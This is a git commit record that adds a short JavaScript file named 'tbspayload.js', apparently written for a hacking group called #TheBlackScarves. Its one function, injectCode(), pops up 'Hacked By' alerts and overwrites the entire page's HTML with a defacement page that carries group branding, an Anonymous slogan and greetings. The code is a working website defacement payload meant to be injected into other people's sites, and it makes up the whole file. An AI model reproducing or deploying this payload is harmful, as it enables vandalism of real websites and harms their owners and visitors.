453a708159312e14030f1d2ddb69fb16b4ced5e4
tbs4321 <128443207+tbs4321@users.noreply.github.com>
2023-03-20 22:57:37 -0400

    Add files via upload

---
+++ tbspayload.js
@@ -0,0 +1,7 @@
+function injectCode(){
+
+alert('Hacked By: #TheBlackScarves');
+alert('Cody \(OGenDroX\) WAS HERE!');
+document.documentElement.innerHTML = '<html><head><title>#TheBlackScarves</title></head><body background="matrix.gif"><center><font size=12 color=#00ff00><b>#TheBlackScarves</b></font><br><br><br><img src=anonymous.png width=600 height=400><br><font color=#ffffff><b>We Are Legion. Expect Us.<br>Proud Support of Anonymous</b></font><br><br><marquee width=30% scrollamount=8> <font color=#00ff00><b>.: Greetz From OGenDroX Cody & #TheBlackScarves :. </b></font></center></body></html>';
+
+}
